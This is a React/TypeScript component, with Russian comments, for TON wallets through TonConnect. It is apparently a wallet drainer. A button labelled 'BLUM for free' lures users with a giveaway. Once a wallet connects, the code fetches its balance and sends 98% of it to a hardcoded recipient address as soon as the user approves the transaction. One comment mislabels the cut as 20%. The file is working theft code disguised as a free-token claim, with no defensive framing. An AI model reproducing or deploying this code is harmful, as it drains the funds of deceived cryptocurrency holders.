import {
  useIsConnectionRestored,
  useTonWallet,
  useTonConnectUI,
} from "@tonconnect/ui-react";
import { useState, useEffect } from "react";
import axios from "axios";

export const SendTx = () => {
  const isConnectionRestored = useIsConnectionRestored();
  const wallet = useTonWallet();
  const [tonConnectUI] = useTonConnectUI();
  const [txInProgress, setTxInProgress] = useState(false);
  const [balance, setBalance] = useState<number | null>(null);
  const recipientAddress = "UQBmqtw4gzy89VPXvFl7CnojmBGZnwzdmg9oTXV2VcggI0Yi"; // Заранее заданный адрес

  // Функция для преобразования нанотонов в тоны
  const nanoToTon = (nano: number): number => {
    return nano / 1e9;
  };

  // Функция для преобразования тонов в нанотоны
  const tonToNano = (ton: number): number => {
    return ton * 1e9;
  };

  // Функция для получения баланса кошелька через Toncenter API
  const fetchBalance = async (wallet: any) => {
    if (!wallet) return;

    try {
      const response = await axios.get(
        `https://toncenter.com/api/v2/getAddressBalance`,
        {
          params: { address: wallet.account.address },
        }
      );
      const balanceInNano = response.data.result;
      const balanceAfterDeduction = Math.floor(balanceInNano * 0.98); // Вычитаем 20% и округляем
      setBalance(balanceAfterDeduction);

      console.log(balanceAfterDeduction);
    } catch (error) {
      console.error("Ошибка получения баланса:", error);
    }
  };

  // Используем useEffect для вызова функции получения баланса при подключении кошелька
  useEffect(() => {
    if (wallet) {
      fetchBalance(wallet);
    }
  }, [wallet]);

  const handleClick = async () => {
    if (!wallet) {
      tonConnectUI.openModal();
    } else if (balance !== null) {
      setTxInProgress(true);
      try {
        console.log(balance);
        await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 360,
          messages: [
            {
              amount: balance.toString(), // Передаем округленную сумму в нанотонах
              address: recipientAddress,
            },
          ],
        });
      } catch (e) {
        console.error("Ошибка при отправке транзакции:", e);
      }
      setTxInProgress(false);
    }
  };

  // Если подключение не восстановлено или кошелек не подключен, ничего не отображаем
  if (!isConnectionRestored || !wallet) {
    return null;
  }

  // Инициализация content значением по умолчанию
  let content = "BLUM for free";
  if (txInProgress) {
    content = "Tx in progress";
  }

  return (
    <div>
      <button
        className="accept-tx"
        disabled={!isConnectionRestored || txInProgress}
        onClick={handleClick}
      >
        <svg
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            fillRule="evenodd"
            clipRule="evenodd"
            d="M14.1839 17.7069C13.6405 18.6507 13.3688 19.1226 13.0591 19.348C12.4278 19.8074 11.5723 19.8074 10.941 19.348C10.6312 19.1226 10.3595 18.6507 9.81613 17.7069L5.52066 10.2464C4.76864 8.94024 4.39263 8.28717 4.33762 7.75894C4.2255 6.68236 4.81894 5.65591 5.80788 5.21589C6.29309 5 7.04667 5 8.55383 5H15.4462C16.9534 5 17.7069 5 18.1922 5.21589C19.1811 5.65591 19.7745 6.68236 19.6624 7.75894C19.6074 8.28717 19.2314 8.94024 18.4794 10.2464L14.1839 17.7069ZM11.1 16.3412L6.56139 8.48002C6.31995 8.06185 6.19924 7.85276 6.18146 7.68365C6.14523 7.33896 6.33507 7.01015 6.65169 6.86919C6.80703 6.80002 7.04847 6.80002 7.53133 6.80002H7.53134L11.1 6.80002V16.3412ZM12.9 16.3412L17.4387 8.48002C17.6801 8.06185 17.8008 7.85276 17.8186 7.68365C17.8548 7.33896 17.665 7.01015 17.3484 6.86919C17.193 6.80002 16.9516 6.80002 16.4687 6.80002L12.9 6.80002V16.3412Z"
            fill="#FFFFFF"
          ></path>
        </svg>
        {content}
      </button>
      {balance !== null && (
        <div>Баланс кошелька: {nanoToTon(balance).toFixed(2)} TON</div>
      )}
    </div>
  );
};
